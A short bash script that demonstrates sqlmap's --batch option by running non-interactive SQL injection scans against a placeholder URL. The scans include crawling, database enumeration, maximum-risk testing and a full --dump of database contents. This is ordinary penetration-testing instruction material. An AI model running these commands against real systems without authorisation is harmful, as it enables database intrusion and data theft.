#!/bin/bash
# SQLmap Automated Testing Script with --batch Option
# Author: Priyanshu K Sharma
# Date: 15 Jan 2025
# Description: Executes SQLmap commands with --batch for fully automated testing.
# The --batch option in SQLmap is used to automate user interaction by assuming default answers to all prompts. 
# This is especially useful for running SQLmap in non-interactive environments like scripts, cron jobs, or pipelines. 


# Check if SQLmap is installed
if ! command -v sqlmap &> /dev/null; then
    echo "SQLmap is not installed. Please install it and try again."
    exit 1
fi

# Target URL
TARGET_URL="http://example.com" # Replace with your target URL

# Example 1: Basic testing with --batch
echo "Running basic testing..."
sqlmap -u "$TARGET_URL" --batch

# Example 2: Crawl and test links with --batch
echo "Running crawling and automated testing..."
sqlmap -u "$TARGET_URL" --crawl 2 --batch

# Example 3: List all databases without user interaction
echo "Listing databases..."
sqlmap -u "$TARGET_URL?id=1" --dbs --batch

# Example 4: Advanced testing with high level and risk
echo "Performing advanced testing..."
sqlmap -u "$TARGET_URL?id=1" --level 5 --risk 3 --batch

# Example 5: Save results to a specific directory
OUTPUT_DIR="/tmp/sqlmap_results"
echo "Saving results to $OUTPUT_DIR..."
sqlmap -u "$TARGET_URL?id=1" --dump --output-dir="$OUTPUT_DIR" --batch

# Script Completed
echo "All tests completed. Results saved in $OUTPUT_DIR (if applicable)."
